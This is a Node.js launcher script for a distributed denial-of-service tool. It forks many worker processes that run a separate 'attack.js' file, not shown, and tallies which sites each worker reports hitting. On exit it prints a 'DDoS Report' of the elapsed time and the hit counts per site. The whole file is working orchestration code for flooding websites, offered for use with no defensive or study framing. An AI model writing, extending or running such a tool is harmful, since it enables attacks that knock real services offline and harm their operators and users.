const childProcess = require('child_process');
const chalk = require('chalk');

const yargs = require('yargs/yargs');
const { hideBin } = require('yargs/helpers');
const argv = yargs(hideBin(process.argv)).argv;

let workerCount = 10;
let counterMap = new Map();
let startTime = Date.now();

if (argv.workers && !isNaN(argv.workers) && parseInt(argv.workers) > 0) {
    workerCount = parseInt(argv.workers);
}

console.log(chalk.cyan('Starting workers...'));

for (let i = 1; i < workerCount + 1; i++) {
    let spawnedProcess = childProcess.fork('attack.js', {stdio: ['pipe', 'pipe', 'pipe', 'ipc']});
    spawnedProcess.on('exit', () => {
        console.log(chalk.yellow(`Worker #${i} exited.`));
    })
    spawnedProcess.on('spawn', () => {
        console.log(chalk.green(`Worker #${i} spawned.`));
    })
    spawnedProcess.on('error', () => {
        console.log(chalk.red(`Worker #${i} encountered an error.`));
    })
    spawnedProcess.on('message', (data) => {
        let site = `${data}`.trim();
        if (counterMap.has(site)) {
            counterMap.set(site, counterMap.get(site) + 1);
        }
        else {
            counterMap.set(site, 1);
        }
        if (!argv.silent) {
            process.stdout.cursorTo(0, i);
            process.stdout.clearLine();
            process.stdout.write(chalk.green(`Worker #${i}: `) + `Hit ${site}`);
        }
    })
}

process.stdin.resume();

function exitHandler() {
    //https://stackoverflow.com/a/14032965
    for(let i = 0; i < workerCount + 2; i++) {
        process.stdout.cursorTo(0, i);
        process.stdout.clearLine();
    }
    process.stdout.cursorTo(0, 0);
    process.stdout.write(chalk.bgBlue(`DDoS Report: \n`));
    process.stdout.write(chalk.bgGray(`Time Elapsed: ${new Date(Date.now() - startTime).toISOString().slice(11, -1)}ms\n`));
    counterMap.forEach((value, key) => {
        process.stdout.write(chalk.greenBright(`Hit ${key} ${value} times.\n`));
    })
    process.exit();
}

process.on('exit', exitHandler.bind(null, { cleanup: true }));
process.on('SIGINT', exitHandler.bind(null, { exit: true }));
process.on('SIGUSR1', exitHandler.bind(null, { exit: true }));
process.on('SIGUSR2', exitHandler.bind(null, { exit: true }));
process.on('uncaughtException', exitHandler.bind(null, { exit: true }));
